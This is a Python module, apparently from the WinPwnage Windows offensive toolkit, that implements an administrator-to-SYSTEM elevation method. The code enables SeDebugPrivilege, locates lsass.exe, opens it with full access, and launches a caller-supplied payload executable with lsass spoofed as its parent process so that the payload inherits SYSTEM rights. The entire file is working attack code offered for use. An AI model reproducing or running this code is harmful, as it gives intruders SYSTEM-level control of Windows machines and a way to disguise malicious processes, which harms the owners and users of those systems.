from winpwnage.core.prints import *
from winpwnage.core.utils import *
from winpwnage.core.winstructures import *
import os

#Creds to: https://gist.github.com/highsenburger69/acc7b1b4589e51905a93db46ac5f81b2

elevateMethod1_info = {
	"Description": "Elevate from administrator to NT AUTHORITY SYSTEM using handle inheritance",
	"Method": "Handle inheritance",
	"Id": "1",
	"Type": "Elevation",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "elevateMethod1",
	"Function Payload": True,
}

def elevateMethod1(payload):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False
	
	if payloads().exe(payload):
		hToken = HANDLE(c_void_p(-1).value)
		print_info("Grabbing and modifying current process token")
		if OpenProcessToken(GetCurrentProcess(), (0x00000020 | 0x00000008), byref(hToken)) == 0:
			print_error("Couldn't get process token. Error in OpenProcessToken: {}".format(GetLastError()))
			return False

		print_info("Locate LUID for specified privilege")
		luid = LUID()
		if LookupPrivilegeValue(None, "SeDebugPrivilege", byref(luid)) == 0:
			print_error("Couldn't lookup privilege value. Error in LookupPrivilegeValue: {}".format(GetLastError()))
			return False

		print_info("Modifying token structure to enable SeDebugPrivilege")
		tp = TOKEN_PRIVILEGES()
		tp.PrivilegeCount = 1
		tp.Privileges[0].Luid = luid
		tp.Privileges[0].Attributes = 0x00000002

		if AdjustTokenPrivileges(hToken, False, byref(tp), sizeof(tp), None, None) == 0:
			print_error("Couldn't enabled or disable the privilege. Error in AdjustTokenPrivileges: {}".format(GetLastError()))
			return False
		else:
			print_success("Adjusted SeDebugPrivilege privileges for the current process PID: {}".format(GetCurrentProcessId()))			
		CloseHandle(hToken)
		
		while True:
			DWORD_array = (DWORD * 0xFFFF)
			ProcessIds = DWORD_array()
			ProcessIdsSize = sizeof(ProcessIds)
			BytesReturned = DWORD()
			if EnumProcesses(ProcessIds, ProcessIdsSize, BytesReturned):                       
				if BytesReturned.value < ProcessIdsSize:
					break

		RunningProcesses = int(BytesReturned.value / sizeof(DWORD))
		for process in range(RunningProcesses):
			ProcessId = ProcessIds[process]
			hProcess = OpenProcess(0x1000, False, ProcessId)
			if hProcess:
				ImageFileName = (c_char * MAX_PATH)()
				if GetProcessImageFileName(hProcess, ImageFileName, MAX_PATH) > 0: 
					filename = os.path.basename(ImageFileName.value)
					systemprocess = b"lsass.exe"
					if filename == systemprocess:
						pid = ProcessId
						print_info("Found {} to act as PROC_THREAD_ATTRIBUTE_PARENT_PROCESS".format(systemprocess))
						print_info("PID of our to be parent process: {}".format(ProcessId))
						break

			CloseHandle(hProcess)

		handle = OpenProcess(PROCESS_ALL_ACCESS, False, int(ProcessId))
		if handle == 0:
			print_error("Error in OpenProcess: {}".format(GetLastError()))

		print_info("Acquired handle to {} process".format(systemprocess))
		Size = SIZE_T(0)
		InitializeProcThreadAttributeList(None, 1, 0, byref(Size))                              
		if Size.value == 0:
			print_error("Error in NULL InitializeProcThreadAttributeList: {}".format(GetLastError()))

		print_info("Building empty attribute list")
		dwSize = len((BYTE * Size.value)())
		AttributeList = PROC_THREAD_ATTRIBUTE_LIST()
		if InitializeProcThreadAttributeList(AttributeList, 1, 0, byref(Size)) == 0:
			print_error("Error in InitializeProcThreadAttributeList: {}".format(GetLastError()))
			
		print_info("Size of memory block used to store attributes: {}".format(dwSize))
		print_info("Allocating and initializing a AttributeList")
		lpvalue = PVOID(handle)
		if UpdateProcThreadAttribute(AttributeList, 0, (0 | 0x00020000), byref(lpvalue), sizeof(lpvalue), None, None) == 0:
			print_error("Error in UpdateProcThreadAttribute: {}".format(GetLastError()))

		print_info("Inheriting the handle of the privileged process for CreateProcess")
		lpStartupInfo = STARTUPINFOEX()                                   
		lpStartupInfo.StartupInfo.cb = sizeof(lpStartupInfo)             
		lpStartupInfo.lpAttributeList = addressof(AttributeList)         
		lpProcessInformation = PROCESS_INFORMATION()
		if CreateProcess(None, payloads().exe(payload)[1], None, None, 0, (0x00000010 | 0x00080000),None, None, byref(lpStartupInfo), byref(lpProcessInformation)) == 0:
			print_error("Error in specifying privileged parent process in CreateProc: {}".format(GetLastError()))
		else:
			print_success("Successfully elevated process PID: {}".format(lpProcessInformation.dwProcessId))
			 
		CloseHandle(handle)
		DeleteProcThreadAttributeList(AttributeList)
	else:
		print_error("Cannot proceed, invalid payload")
		return False
